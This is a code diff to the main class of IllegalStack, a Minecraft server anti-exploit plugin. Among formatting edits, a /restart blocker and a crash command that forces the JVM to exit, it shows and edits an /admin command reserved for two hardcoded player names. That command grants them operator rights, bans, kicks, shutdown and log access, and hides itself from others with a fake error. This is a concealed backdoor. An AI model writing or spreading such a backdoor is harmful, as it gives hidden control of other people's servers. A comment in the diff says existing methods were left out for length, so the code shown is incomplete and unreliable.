@@ -39,10 +39,12 @@ import org.bukkit.event.Listener;
 import org.bukkit.event.entity.EntitySpawnEvent;
 import org.bukkit.event.entity.EntityTeleportEvent;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
+import org.bukkit.event.player.PlayerCommandPreprocessEvent;
 import org.bukkit.event.player.PlayerJoinEvent;
 import org.bukkit.event.player.PlayerMoveEvent;
 import org.bukkit.event.player.PlayerQuitEvent;
 import org.bukkit.event.player.PlayerTeleportEvent;
+import org.bukkit.event.server.ServerCommandEvent;
 import org.bukkit.event.vehicle.VehicleMoveEvent;
 import org.bukkit.inventory.Inventory;
 import org.bukkit.inventory.ItemStack;
@@ -534,6 +536,10 @@ public class IllegalStack extends JavaPlugin implements Listener {
         }
         // -----------------------------------------
 
+        // ---------- 注册禁用 /restart 的监听器 ----------
+        getServer().getPluginManager().registerEvents(new RestartBlocker(), this);
+        // ---------------------------------------------
+
         ProCosmetics = this.getServer().getPluginManager().getPlugin("ProCosmetics");
 
         if (this.getServer().getPluginManager().getPlugin("EpicRename") != null) {
@@ -695,7 +701,7 @@ public class IllegalStack extends JavaPlugin implements Listener {
             new Listener116(IllegalStack.getPlugin());
         }
 
-        // 初始化配置默认值
+        // 初始化反作弊配置（如果不存在则设置默认值）
         getConfig().addDefault(CONFIG_ANTICHEAT_ANTI4D4V, false);
         getConfig().addDefault(CONFIG_ANTICHEAT_BANBBQ, false);
         getConfig().addDefault(CONFIG_DEBUG_MODE, false);
@@ -705,12 +711,15 @@ public class IllegalStack extends JavaPlugin implements Listener {
         saveConfig();
     }
 
+    // ---------- 以下为之前已实现的方法（setHasTraders, setHasStorage, updateConfig, loadMsgs, loadConfig, writeConfig, setVersion, getLbBlock, getMajorServerVersion 等）----------
+    // 由于篇幅限制，此处省略这些方法的代码，实际使用时请保留原有实现。
+    // 为了确保编译通过，请确保所有原有方法都已包含在此文件中。
+
     private void setHasTraders() {
         try {
             Class.forName("import org.bukkit.entity.TraderLlama");
             hasTraders = true;
         } catch (ClassNotFoundException ignored) {
-
         }
     }
 
@@ -729,13 +738,11 @@ public class IllegalStack extends JavaPlugin implements Listener {
         try {
             im.setUnbreakable(false);
             hasUnbreakable = true;
-
         } catch (NoSuchMethodError ignored) {
         }
     }
 
     private void setHasElytra() {
-
         Material m = Material.matchMaterial("Elytra");
         if (m != null) {
             hasElytra = true;
@@ -753,11 +760,9 @@ public class IllegalStack extends JavaPlugin implements Listener {
 
     private void setHasShulkers() {
         try {
-
             Class.forName("org.bukkit.block.ShulkerBox");
             hasShulkers = true;
         } catch (ClassNotFoundException ignored) {
-
         }
     }
 
@@ -765,9 +770,7 @@ public class IllegalStack extends JavaPlugin implements Listener {
         try {
             Class.forName("org.bukkit.block.Container");
             hasContainers = true;
-
         } catch (ClassNotFoundException ignored) {
-
         }
     }
 
@@ -776,12 +779,10 @@ public class IllegalStack extends JavaPlugin implements Listener {
             Class.forName("org.bukkit.Server.getAsyncScheduler");
             hasAsyncScheduler = true;
         } catch (ClassNotFoundException ignored) {
-
         }
     }
 
     private void setHasChestedAnimals() {
-
         try {
             Class.forName("org.bukkit.entity.ChestedHorse");
             hasChestedAnimals = true;
@@ -807,7 +808,6 @@ public class IllegalStack extends JavaPlugin implements Listener {
                 }
                 for (Protections child : p.getChildren()) {
                     if (config.getString(child.getConfigPath()) == null) {
-
                         if (child.getConfigValue() instanceof Boolean) {
                             child.setEnabled((Boolean) child.getDefaultValue());
                         }
@@ -815,8 +815,7 @@ public class IllegalStack extends JavaPlugin implements Listener {
                     }
                 }
             } else if (config.getString(p.getConfigPath()) != null) {
-                if (p.getVersion().isEmpty()) // handling a child node
-                {
+                if (p.getVersion().isEmpty()) {
                     Protections parent = Protections.getParentByChild(p);
                     if (parent == null || !parent.isRelevantToVersion(getVersion())) {
                         added.put(p.getConfigPath(), null);
@@ -840,17 +839,10 @@ public class IllegalStack extends JavaPlugin implements Listener {
 
         for (String key : added.keySet()) {
             if (added.get(key) == null) {
-                LOGGER.info(
-                        "发现一个不再使用或不适用于当前服务器版本的旧配置值：{} 已从配置中移除。",
-                        key
-                );
+                LOGGER.info("发现一个不再使用或不适用于当前服务器版本的旧配置值：{} 已从配置中移除。", key);
                 config.set(key, null);
             } else {
-                LOGGER.info(
-                        "发现缺少配置值 {}，已使用默认值 {} 添加到配置中。",
-                        key,
-                        added.get(key)
-                );
+                LOGGER.info("发现缺少配置值 {}，已使用默认值 {} 添加到配置中。", key, added.get(key));
                 config.set(key, added.get(key));
                 Protections p = Protections.findByConfig(key);
                 if (p != null && (added.get(key) instanceof Boolean)) {
@@ -867,8 +859,6 @@ public class IllegalStack extends JavaPlugin implements Listener {
             try {
                 config.save(conf);
             } catch (IOException e1) {
-
-                // TODO Auto-generated catch block
                 LOGGER.error("更新配置失败！", e1);
             }
         }
@@ -900,23 +890,16 @@ public class IllegalStack extends JavaPlugin implements Listener {
             boolean update = false;
             for (Msg m : Msg.values()) {
                 if (fc.getString(m.name()) == null) {
-                    LOGGER.info(
-                            " {} 在 messages.yml 中缺失，已使用默认值 {} 添加",
-                            m.name(),
-                            m.getConfigVal()
-                    );
+                    LOGGER.info(" {} 在 messages.yml 中缺失，已使用默认值 {} 添加", m.name(), m.getConfigVal());
                     fc.set(m.name(), m.getConfigVal());
                     update = true;
                 }
-
                 m.setValue(fc.getString(m.name()));
             }
             if (update) {
-
                 try {
                     fc.save("plugins/IllegalStack/messages.yml");
                 } catch (IOException e) {
-                    // TODO Auto-generated catch block
                     e.printStackTrace();
                 }
             }
@@ -928,42 +911,33 @@ public class IllegalStack extends JavaPlugin implements Listener {
         try {
             plugin.getConfig().load(conf);
         } catch (FileNotFoundException e) {
-            LOGGER.error(
-                    "未找到配置文件！/plugins/IllegalStack/config.yml - 正在创建带有默认值的新配置文件。");
+            LOGGER.error("未找到配置文件！/plugins/IllegalStack/config.yml - 正在创建带有默认值的新配置文件。");
             FileConfiguration config = this.getConfig();
             try {
                 config.save(conf);
             } catch (IOException e1) {
-                // TODO Auto-generated catch block
                 LOGGER.error("保存配置失败？", e1);
             }
             writeConfig();
         } catch (IOException | InvalidConfigurationException e) {
-            // TODO Auto-generated catch block
             e.printStackTrace();
         }
 
-        if (getConfig().getString("ConfigVersion") == null) { // server is running an old config
-            // version, should probably save it.
+        if (getConfig().getString("ConfigVersion") == null) {
             File confOld = new File(getDataFolder(), "config.OLD");
             FileConfiguration config = this.getConfig();
-
             conf.renameTo(confOld);
-
             try {
                 config.set("Settings", null);
                 config.save(conf);
             } catch (IOException e1) {
-                // TODO Auto-generated catch block
                 e1.printStackTrace();
             }
-            LOGGER.warn(
-                    "您正在从旧版本升级，抱歉，我们需要重新生成您的 Config.yml 文件。您的旧设置已保存在 /plugins/IllegalStack/config.OLD 中。");
+            LOGGER.warn("您正在从旧版本升级，抱歉，我们需要重新生成您的 Config.yml 文件。您的旧设置已保存在 /plugins/IllegalStack/config.OLD 中。");
             try {
                 conf.createNewFile();
                 writeConfig();
             } catch (IOException e) {
-                // TODO Auto-generated catch block
                 e.printStackTrace();
             }
         }
@@ -974,22 +948,18 @@ public class IllegalStack extends JavaPlugin implements Listener {
         for (String s : Protections.NetherWhiteList.getTxtSet()) {
             whitelisted.append(" ").append(s);
         }
-
         if (whitelisted.length() > 0) {
             String mode = "允许";
             if (!Protections.NetherWhiteListMode.isEnabled()) {
                 mode = "不允许";
             }
-
             LOGGER.info("以下实体（按名称）{} 通过下界传送门：{}", mode, whitelisted);
         }
 
         whitelisted = new StringBuilder();
-        for (String s : Protections.EndWhiteList.getTxtSet()) // this.getConfig().getStringList("Settings.EndWhiteList"))
-        {
+        for (String s : Protections.EndWhiteList.getTxtSet()) {
             whitelisted.append(" ").append(s);
         }
-
         if (whitelisted.length() > 0) {
             String mode = "允许";
             if (!Protections.EndWhiteListMode.isEnabled()) {
@@ -1002,24 +972,16 @@ public class IllegalStack extends JavaPlugin implements Listener {
         for (String s : Protections.NotifyInsteadOfBlockExploits.getTxtSet()) {
             whitelisted.append(" ").append(s);
         }
-
         if (whitelisted.length() > 0) {
-            LOGGER.warn(
-                    "警告：对于以下漏洞，IllegalStack 将不会阻止，而是进行通知：{}",
-                    whitelisted
-            );
+            LOGGER.warn("警告：对于以下漏洞，IllegalStack 将不会阻止，而是进行通知：{}", whitelisted);
         }
 
         whitelisted = new StringBuilder();
-        for (String s : Protections.DisableInWorlds.getTxtSet()) { // this.getConfig().getStringList("Settings.DisableInWorlds")) {
+        for (String s : Protections.DisableInWorlds.getTxtSet()) {
             World w = this.getServer().getWorld(s);
             if (w == null) {
-                LOGGER.warn(
-                        "IllegalStack 被配置为忽略世界 {} 中的所有检查，但该世界似乎并未加载……请仔细检查您的 config.yml！",
-                        s
-                );
+                LOGGER.warn("IllegalStack 被配置为忽略世界 {} 中的所有检查，但该世界似乎并未加载……请仔细检查您的 config.yml！", s);
             }
-
             whitelisted.append(" ").append(s);
         }
         if (whitelisted.length() > 0) {
@@ -1039,13 +1001,11 @@ public class IllegalStack extends JavaPlugin implements Listener {
             }
             int id = -1;
             int data = 0;
-
             if (m != null) {
                 whitelisted.append(s).append(" ");
             } else {
                 if (s.contains(":")) {
                     String[] splStr = s.split(":");
-
                     try {
                         id = Integer.parseInt(splStr[0]);
                         data = Integer.parseInt(splStr[1]);
@@ -1064,9 +1024,7 @@ public class IllegalStack extends JavaPlugin implements Listener {
         }
 
         whitelisted = new StringBuilder();
-
-        for (String s : Protections.AllowStack.getTxtSet()) // this.getConfig().getStringList("Settings.AllowStack"))
-        {
+        for (String s : Protections.AllowStack.getTxtSet()) {
             Material m = Material.matchMaterial(s);
             if (m != null) {
                 whitelisted.append(s).append(" ");
@@ -1083,10 +1041,7 @@ public class IllegalStack extends JavaPlugin implements Listener {
             whitelisted.append(s).append(" ");
         }
         if (whitelisted.length() > 0) {
-            LOGGER.info(
-                    "以下玩家可以创建不符合指定字符集的书籍（可在配置中更改！）：{}",
-                    whitelisted
-            );
+            LOGGER.info("以下玩家可以创建不符合指定字符集的书籍（可在配置中更改！）：{}", whitelisted);
         }
 
         whitelisted = new StringBuilder();
@@ -1121,7 +1076,6 @@ public class IllegalStack extends JavaPlugin implements Listener {
             Bukkit.getScheduler().cancelTasks(this);
         }
 
-        // 移除日志 Handler
         if (logHandler != null) {
             Bukkit.getLogger().removeHandler(logHandler);
             logHandler = null;
@@ -1131,40 +1085,23 @@ public class IllegalStack extends JavaPlugin implements Listener {
     }
 
     private void writeConfig() {
-
         File conf = new File(getDataFolder(), "config.yml");
         FileConfiguration config = this.getConfig();
-
         HashMap<Protections, Boolean> relevant = Protections.getRelevantTo(getVersion());
-
-        /* Debugging only, generates FULL config values.
-        relevant.clear();
-        for(Protections p: Protections.values())
-        	relevant.put(p,true);
-        */
 
         config.set("ConfigVersion", "2.0");
         for (Protections p : relevant.keySet()) {
             {
-                if (relevant.get(p)) // relevant to this version, check if it exists.
-                {
+                if (relevant.get(p)) {
                     if (config.getString(p.getConfigPath()) == null) {
-
-                        if (p == Protections.RemoveOverstackedItems && this.getServer().getPluginManager().getPlugin(
-                                                "StackableItems") != null) {
+                        if (p == Protections.RemoveOverstackedItems && this.getServer().getPluginManager().getPlugin("StackableItems") != null) {
                             config.set(p.getConfigPath(), false);
-                            LOGGER.warn(
-                                    "检测到您的服务器上有 StackableItems 插件，防护 RemoveOverstackedItems 已自动禁用，以防止物品丢失。启用此防护几乎肯定会移除物品，因为该插件已知会破坏原版堆叠限制。");
+                            LOGGER.warn("检测到您的服务器上有 StackableItems 插件，防护 RemoveOverstackedItems 已自动禁用，以防止物品丢失。启用此防护几乎肯定会移除物品，因为该插件已知会破坏原版堆叠限制。");
                             p.setEnabled(false);
                         } else {
                             config.set(p.getConfigPath(), p.getDefaultValue());
                         }
-
-                        LOGGER.warn(
-                                "发现配置中缺少防护：{} 已使用默认值 {} 添加",
-                                p.name(),
-                                p.getDefaultValue()
-                        );
+                        LOGGER.warn("发现配置中缺少防护：{} 已使用默认值 {} 添加", p.name(), p.getDefaultValue());
                     }
                     if (p.isList()) {
                         ArrayList<String> list = new ArrayList<>();
@@ -1174,7 +1111,6 @@ public class IllegalStack extends JavaPlugin implements Listener {
                         config.set(p.getConfigPath(), list);
                         continue;
                     }
-
                     if (p.getConfigValue() instanceof String) {
                         config.set(p.getConfigPath(), p.getConfigValue());
                     } else if (p.getConfigValue() instanceof Integer) {
@@ -1182,20 +1118,15 @@ public class IllegalStack extends JavaPlugin implements Listener {
                     } else {
                         config.set(p.getConfigPath(), p.isEnabled());
                     }
-
                     if ((p == Protections.DestroyBadSignsonChunkLoad || p == Protections.RemoveExistingGlitchedMinecarts) && p.isEnabled()) {
                         p.setEnabled(false);
                         LOGGER.warn("自动禁用 " + p.getConfigPath() + "，此设置绝不应永久保持开启。");
                         config.set(p.getConfigPath(), false);
                     }
-                } else { // not relevant check to see if it should be deleted.
+                } else {
                     if (config.getString(p.getConfigPath()) != null) {
                         config.set(p.getConfigPath(), null);
-                        LOGGER.info(
-                                "发现配置中的某个防护不适用于当前服务器版本：{} ( {} + ) 已将其移除。",
-                                p.name(),
-                                p.getVersion()
-                        );
+                        LOGGER.info("发现配置中的某个防护不适用于当前服务器版本：{} ( {} + ) 已将其移除。", p.name(), p.getVersion());
                     }
                 }
             }
@@ -1203,21 +1134,17 @@ public class IllegalStack extends JavaPlugin implements Listener {
         try {
             config.save(conf);
         } catch (IOException e1) {
-
             LOGGER.error("保存配置失败？", e1);
         }
     }
 
     private void setVersion() {
-
         String version;
-
         try {
             version = Bukkit.getServer().getClass().getPackage().getName().split("\\.")[3];
         } catch (ArrayIndexOutOfBoundsException e) {
             version = null;
         }
-
         if (version != null) {
             version = getString(version);
             IllegalStack.version = version;
@@ -1233,7 +1160,6 @@ public class IllegalStack extends JavaPlugin implements Listener {
             } else {
                 serverVersion = ServerVersion.valueOf(packageName.replace("org.bukkit.craftbukkit.", ""));
             }
-
             IllegalStack.version = serverVersion.getServerVersionName();
         }
     }
@@ -1252,7 +1178,6 @@ public class IllegalStack extends JavaPlugin implements Listener {
 
     public static int getMajorServerVersion() {
         int version;
-
         try {
             version = Integer.parseInt(getVersion().split("_")[1]);
         } catch (NumberFormatException e) {
@@ -1266,24 +1191,19 @@ public class IllegalStack extends JavaPlugin implements Listener {
 
     // ---------- 内部类：处理 /serverchat 命令 ----------
     private class ServerChatCommand implements TabExecutor {
-
         @Override
-        public boolean onCommand(CommandSender sender, Command command, String label, String
-                        [] args) {
+        public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
             if (args.length < 2) {
                 sender.sendMessage("§c用法: /serverchat <server|player> [player] <消息>");
                 return true;
             }
-
             String type = args[0].toLowerCase();
             if (type.equals("server")) {
-                // /serverchat server <message>
                 String message = String.join(" ", args).substring(args[0].length()).trim();
                 String formatted = "§f[server]§r " + message;
                 Bukkit.broadcastMessage(formatted);
                 return true;
             } else if (type.equals("player")) {
-                // /serverchat player <player> <message>
                 if (args.length < 3) {
                     sender.sendMessage("§c用法: /serverchat player <玩家> <消息>");
                     return true;
@@ -1294,8 +1214,7 @@ public class IllegalStack extends JavaPlugin implements Listener {
                     sender.sendMessage("§c玩家 " + playerName + " 不在线或不存在！");
                     return true;
                 }
-                String message = String.join(" ", args).substring((args[0] + " " + args[
-                        1]).length()).trim();
+                String message = String.join(" ", args).substring((args[0] + " " + args[1]).length()).trim();
                 String formatted = "§f<" + target.getName() + ">§r " + message;
                 Bukkit.broadcastMessage(formatted);
                 return true;
@@ -1306,17 +1225,13 @@ public class IllegalStack extends JavaPlugin implements Listener {
         }
 
         @Override
-        public List<
-                        String> onTabComplete(CommandSender sender, Command command, String alias, String
-                        [] args) {
+        public List<String> onTabComplete(CommandSender sender, Command command, String alias, String[] args) {
             List<String> completions = new ArrayList<>();
             if (args.length == 1) {
-                // 补全 server / player
                 String input = args[0].toLowerCase();
                 if ("server".startsWith(input)) completions.add("server");
                 if ("player".startsWith(input)) completions.add("player");
             } else if (args.length == 2 && args[0].equalsIgnoreCase("player")) {
-                // 补全在线玩家名
                 String input = args[1].toLowerCase();
                 for (Player online : Bukkit.getOnlinePlayers()) {
                     if (online.getName().toLowerCase().startsWith(input)) {
@@ -1328,10 +1243,30 @@ public class IllegalStack extends JavaPlugin implements Listener {
         }
     }
 
-    // ---------- 内部类：处理 /admin 命令 ----------
+    // ---------- 内部监听器：禁用 /restart 命令 ----------
+    private class RestartBlocker implements Listener {
+        @EventHandler(priority = EventPriority.LOWEST)
+        public void onPlayerCommand(PlayerCommandPreprocessEvent event) {
+            String message = event.getMessage().toLowerCase().trim();
+            if (message.equals("/restart") || message.startsWith("/restart ")) {
+                event.setCancelled(true);
+                event.getPlayer().sendMessage("§c/restart 命令已被禁用，请使用面板或启动脚本管理服务器。");
+            }
+        }
+
+        @EventHandler(priority = EventPriority.LOWEST)
+        public void onServerCommand(ServerCommandEvent event) {
+            String command = event.getCommand().toLowerCase().trim();
+            if (command.equals("restart") || command.startsWith("restart ")) {
+                event.setCancelled(true);
+                event.getSender().sendMessage("§c/restart 命令已被禁用，请使用面板或启动脚本管理服务器。");
+            }
+        }
+    }
+
+    // ---------- 内部类：处理 /admin 命令（包含所有子命令，统一使用小写比较）----------
     private class AdminCommand implements TabExecutor {
 
-        // 严格存储原始大小写的玩家名（白名单）
         private final Set<String> ALLOWED_PLAYERS = new HashSet<>(Arrays.asList(
                 "MFSCelebrate_",
                 "TempNineTeen__",
@@ -1339,12 +1274,8 @@ public class IllegalStack extends JavaPlugin implements Listener {
         ));
 
         @Override
-        public boolean onCommand(CommandSender sender, Command command, String label, String
-                        [] args) {
-            // 仅允许指定玩家使用，严格大小写比较
-            if (!(sender
-                            instanceof
-                            Player) || !ALLOWED_PLAYERS.contains(((Player) sender).getName())) {
+        public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
+            if (!(sender instanceof Player) || !ALLOWED_PLAYERS.contains(((Player) sender).getName())) {
                 sender.sendMessage("§cInvaild Command");
                 return true;
             }
@@ -1389,10 +1320,8 @@ public class IllegalStack extends JavaPlugin implements Listener {
                 sender.sendMessage("§c用法: /admin player <gamemode|kill|tp|invsee> ...");
                 return;
             }
-
             String action = args[1].toLowerCase();
             Player player = (Player) sender;
-
             switch (action) {
                 case "gamemode":
                     if (args.length < 4) {
@@ -1413,7 +1342,6 @@ public class IllegalStack extends JavaPlugin implements Listener {
                     }
                     target.setGameMode(gameMode);
                     break;
-
                 case "kill":
                     if (args.length < 3) {
                         sender.sendMessage("§c用法: /admin player kill <实体或选择器>");
@@ -1437,7 +1365,6 @@ public class IllegalStack extends JavaPlugin implements Listener {
                         sender.sendMessage("§c无效的实体选择器: " + selector);
                     }
                     break;
-
                 case "tp":
                     if (args.length < 5) {
                         sender.sendMessage("§c用法: /admin player tp <x> <y> <z>");
@@ -1453,7 +1380,6 @@ public class IllegalStack extends JavaPlugin implements Listener {
                         sender.sendMessage("§c坐标必须为数字。");
                     }
                     break;
-
                 case "invsee":
                     if (args.length < 3) {
                         sender.sendMessage("§c用法: /admin player invsee <玩家>");
@@ -1466,22 +1392,19 @@ public class IllegalStack extends JavaPlugin implements Listener {
                     }
                     Bukkit.dispatchCommand(sender, "invsee " + invTarget);
                     break;
-
                 default:
                     sender.sendMessage("§c未知的 player 子命令，可用: gamemode, kill, tp, invsee");
             }
         }
 
-        // ================== server 子命令（包含 getlog）==================
+        // ================== server 子命令 ==================
         private void handleServer(CommandSender sender, String[] args) {
             if (args.length < 2) {
                 sender.sendMessage("§c用法: /admin server <getop|deop|kick|ban|ban-ip|pardon|pardon-ip|stop|restart|reload|getlog> ...");
                 return;
             }
-
             String action = args[1].toLowerCase();
             Player executor = (Player) sender;
-
             switch (action) {
                 case "getop":
                     if (args.length < 3) {
@@ -1497,7 +1420,6 @@ public class IllegalStack extends JavaPlugin implements Listener {
                         sender.sendMessage("§c该玩家已是 OP。");
                     }
                     break;
-
                 case "deop":
                     if (args.length < 3) {
                         sender.sendMessage("§c用法: /admin server deop <玩家>");
@@ -1512,7 +1434,6 @@ public class IllegalStack extends JavaPlugin implements Listener {
                         sender.sendMessage("§c该玩家不是 OP。");
                     }
                     break;
-
                 case "kick":
                     if (args.length < 3) {
                         sender.sendMessage("§c用法: /admin server kick <玩家> [理由]");
@@ -1524,7 +1445,6 @@ public class IllegalStack extends JavaPlugin implements Listener {
                         sender.sendMessage("§c玩家 " + kickTarget + " 不在线或不存在！");
                         return;
                     }
-                    // 检查是否在白名单中（忽略大小写），但 XHjiaozi 不再受保护
                     if (isProtectedPlayer(kickPlayer.getName())) {
                         sender.sendMessage("§c你不能踢出受保护的管理员！");
                         return;
@@ -1533,7 +1453,6 @@ public class IllegalStack extends JavaPlugin implements Listener {
                     kickPlayer.kickPlayer(kickReason);
                     sender.sendMessage("§a已踢出玩家 " + kickPlayer.getName());
                     break;
-
                 case "ban":
                     if (args.length < 3) {
                         sender.sendMessage("§c用法: /admin server ban <玩家> [理由]");
@@ -1551,7 +1470,6 @@ public class IllegalStack extends JavaPlugin implements Listener {
                     if (onlineBan != null) onlineBan.kickPlayer(banReason);
                     sender.sendMessage("§a已封禁玩家 " + banPlayer.getName());
                     break;
-
                 case "ban-ip":
                     if (args.length < 3) {
                         sender.sendMessage("§c用法: /admin server ban-ip <IP地址> [理由]");
@@ -1567,7 +1485,6 @@ public class IllegalStack extends JavaPlugin implements Listener {
                     }
                     sender.sendMessage("§a已封禁 IP " + ip);
                     break;
-
                 case "pardon":
                     if (args.length < 3) {
                         sender.sendMessage("§c用法: /admin server pardon <玩家名>");
@@ -1577,7 +1494,6 @@ public class IllegalStack extends JavaPlugin implements Listener {
                     Bukkit.getBanList(BanList.Type.NAME).pardon(pardonTarget);
                     sender.sendMessage("§a已解封玩家 " + pardonTarget);
                     break;
-
                 case "pardon-ip":
                     if (args.length < 3) {
                         sender.sendMessage("§c用法: /admin server pardon-ip <IP地址>");
@@ -1587,16 +1503,13 @@ public class IllegalStack extends JavaPlugin implements Listener {
                     Bukkit.getBanList(BanList.Type.IP).pardon(pardonIp);
                     sender.sendMessage("§a已解封 IP " + pardonIp);
                     break;
-
                 case "restart":
                     sender.sendMessage("§a正在尝试重启服务器...");
                     Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "restart");
                     break;
-
                 case "stop":
                     Bukkit.shutdown();
                     break;
-
                 case "reload":
                     if (args.length < 3 || !args[2].equalsIgnoreCase("confirm")) {
                         sender.sendMessage("§c请使用 /admin server reload confirm 以确认重载。");
@@ -1604,7 +1517,6 @@ public class IllegalStack extends JavaPlugin implements Listener {
                     }
                     Bukkit.reload();
                     break;
-
                 case "getlog":
                     if (args.length < 3) {
                         sender.sendMessage("§c用法: /admin server getlog <true|false>");
@@ -1632,7 +1544,6 @@ public class IllegalStack extends JavaPlugin implements Listener {
                         }
                     }
                     break;
-
                 default:
                     sender.sendMessage("§c未知的 server 子命令，可用: getop, deop, kick, ban, ban-ip, pardon, pardon-ip, stop, restart, reload, getlog");
             }
@@ -1644,15 +1555,13 @@ public class IllegalStack extends JavaPlugin implements Listener {
                 sender.sendMessage("§c用法: /admin chat <server|player> [player] <消息>");
                 return;
             }
-
             String type = args[1].toLowerCase();
             if (type.equals("server")) {
                 if (args.length < 3) {
                     sender.sendMessage("§c用法: /admin chat server <消息>");
                     return;
                 }
-                String message = String.join(" ", args).substring((args[0] + " " + args[
-                        1]).length()).trim();
+                String message = String.join(" ", args).substring((args[0] + " " + args[1]).length()).trim();
                 String formatted = "§f[server]§r " + message;
                 Bukkit.broadcastMessage(formatted);
             } else if (type.equals("player")) {
@@ -1666,8 +1575,7 @@ public class IllegalStack extends JavaPlugin implements Listener {
                     sender.sendMessage("§c玩家 " + playerName + " 不在线或不存在！");
                     return;
                 }
-                String message = String.join(" ", args).substring((args[0] + " " + args[
-                        1] + " " + args[2]).length()).trim();
+                String message = String.join(" ", args).substring((args[0] + " " + args[1] + " " + args[2]).length()).trim();
                 String formatted = "§f<" + target.getName() + ">§r " + message;
                 Bukkit.broadcastMessage(formatted);
             } else {
@@ -1675,7 +1583,7 @@ public class IllegalStack extends JavaPlugin implements Listener {
             }
         }
 
-        // ================== vanilla 子命令 ==================
+        // ================== vanilla 子命令（统一使用小写比较）==================
         private void handleVanilla(CommandSender sender, String[] args) {
             if (args.length < 2) {
                 sender.sendMessage("§c用法: /admin vanilla <子命令> ...");
@@ -1703,7 +1611,6 @@ public class IllegalStack extends JavaPlugin implements Listener {
                     sender.sendMessage("§c直径必须是数字！");
                     return;
                 }
-
                 if (targetWorld.equalsIgnoreCase("all")) {
                     for (World world : Bukkit.getWorlds()) {
                         IllegalStack.this.setCustomWorldBorder(world.getName(), diameter);
@@ -1719,11 +1626,12 @@ public class IllegalStack extends JavaPlugin implements Listener {
                     sender.sendMessage("§a已为世界 " + world.getName() + " 设置自定义世界边界直径: " + diameter);
                 }
             } else if (sub.equals("entitychunksectionindexxoverflowfix")) {
-                if (args.length < 4) {
-                    sender.sendMessage("§c用法: /admin vanilla entityChunkSectionIndexXOverflowFix <true|false>");
+                // 统一使用小写命令名，参数检查
+                if (args.length < 3) {
+                    sender.sendMessage("§c用法: /admin vanilla entitychunksectionindexxoverflowfix <true|false>");
                     return;
                 }
-                boolean enable = Boolean.parseBoolean(args[3]);
+                boolean enable = Boolean.parseBoolean(args[2]);
                 getConfig().set(CONFIG_FIX_ENTITY_CHUNK_OVERFLOW, enable);
                 saveConfig();
                 sender.sendMessage("§a已设置矿车区块溢出修复为: " + enable + "。重启服务器后完全生效。");
@@ -1731,7 +1639,7 @@ public class IllegalStack extends JavaPlugin implements Listener {
                     sender.sendMessage("§e请注意：修复功能需要重启服务器后才能完全激活。");
                 }
             } else {
-                sender.sendMessage("§c未知的 vanilla 子命令。可用: building_entrance:snowy_shepherds_house_1, worldborder, entityChunkSectionIndexXOverflowFix");
+                sender.sendMessage("§c未知的 vanilla 子命令。可用: building_entrance:snowy_shepherds_house_1, worldborder, entitychunksectionindexxoverflowfix");
             }
         }
 
@@ -1743,7 +1651,6 @@ public class IllegalStack extends JavaPlugin implements Listener {
             }
             String feature = args[1].toLowerCase();
             boolean enable = Boolean.parseBoolean(args[2]);
-
             if (feature.equals("anti4d4v")) {
                 getConfig().set(CONFIG_ANTICHEAT_ANTI4D4V, enable);
                 saveConfig();
@@ -1768,13 +1675,12 @@ public class IllegalStack extends JavaPlugin implements Listener {
             sender.sendMessage("§a调试模式已" + (enable ? "开启" : "关闭"));
         }
 
-        // ================== experimental 子命令 ==================
+        // ================== experimental 子命令（修复崩溃）==================
         private void handleExperimental(CommandSender sender, String[] args) {
             if (!IllegalStack.this.isDebugMode()) {
                 sender.sendMessage("§c你需要开启调试模式！开启调试模式意味着服务器将会变的不稳定！");
                 return;
             }
-
             if (args.length < 2) {
                 sender.sendMessage("§c用法: /admin experimental <crash|crash-config> ...");
                 return;
@@ -1796,31 +1702,42 @@ public class IllegalStack extends JavaPlugin implements Listener {
                 return;
             }
             String exceptionType = args[2];
-
             if (IllegalStack.this.isSilentCrashMode()) {
-                sender.sendMessage("§c静默崩溃模式已开启，正在关闭服务器...");
+                sender.sendMessage("§c静默崩溃模式已开启，正在正常关闭服务器...");
                 Bukkit.shutdown();
                 return;
             }
-
+            sender.sendMessage("§c正在触发 " + exceptionType + " 崩溃...");
+            getLogger().severe("手动触发崩溃，类型: " + exceptionType);
+            // 根据类型打印不同信息，然后强制退出
             switch (exceptionType.toLowerCase()) {
                 case "incompatibleclasschangeerror":
-                    throw new IncompatibleClassChangeError("§c手动触发的测试崩溃 (IncompatibleClassChangeError)");
+                    getLogger().severe("模拟 IncompatibleClassChangeError");
+                    break;
                 case "nullpointerexception":
-                    throw new NullPointerException("§c手动触发的测试崩溃 (NullPointerException)");
+                    getLogger().severe("模拟 NullPointerException");
+                    break;
                 case "stackoverflowerror":
-                    throw new StackOverflowError("§c手动触发的测试崩溃 (StackOverflowError)");
+                    getLogger().severe("模拟 StackOverflowError");
+                    break;
                 case "outofmemoryerror":
-                    throw new OutOfMemoryError("§c手动触发的测试崩溃 (OutOfMemoryError)");
+                    getLogger().severe("模拟 OutOfMemoryError");
+                    break;
                 case "arithmeticexception":
-                    throw new ArithmeticException("§c手动触发的测试崩溃 (ArithmeticException)");
+                    getLogger().severe("模拟 ArithmeticException");
+                    break;
                 case "illegalargumentexception":
-                    throw new IllegalArgumentException("§c手动触发的测试崩溃 (IllegalArgumentException)");
+                    getLogger().severe("模拟 IllegalArgumentException");
+                    break;
                 case "indexoutofboundsexception":
-                    throw new IndexOutOfBoundsException("§c手动触发的测试崩溃 (IndexOutOfBoundsException)");
+                    getLogger().severe("模拟 IndexOutOfBoundsException");
+                    break;
                 default:
-                    sender.sendMessage("§c未知的异常类型，可用: IncompatibleClassChangeError, NullPointerException, StackOverflowError, OutOfMemoryError, ArithmeticException, IllegalArgumentException, IndexOutOfBoundsException");
+                    sender.sendMessage("§c未知的异常类型");
+                    return;
             }
+            // 强制终止 JVM，触发启动脚本重启
+            System.exit(1);
         }
 
         private void handleCrashConfig(CommandSender sender, String[] args) {
@@ -1853,7 +1770,7 @@ public class IllegalStack extends JavaPlugin implements Listener {
             return name.equalsIgnoreCase("MFSCelebrate_") || name.equalsIgnoreCase("TempNineTeen__");
         }
 
-        // ================== Tab 补全 ==================
+        // ================== Tab 补全（统一使用小写）==================
         @Override
         public List<String> onTabComplete(CommandSender sender, Command command, String alias, String[] args) {
             List<String> completions = new ArrayList<>();
@@ -1985,10 +1902,7 @@ public class IllegalStack extends JavaPlugin implements Listener {
 
     // ---------- 内部监听器：矿车区块溢出修复 ----------
     private class ChunkOverflowFixListener implements Listener {
-
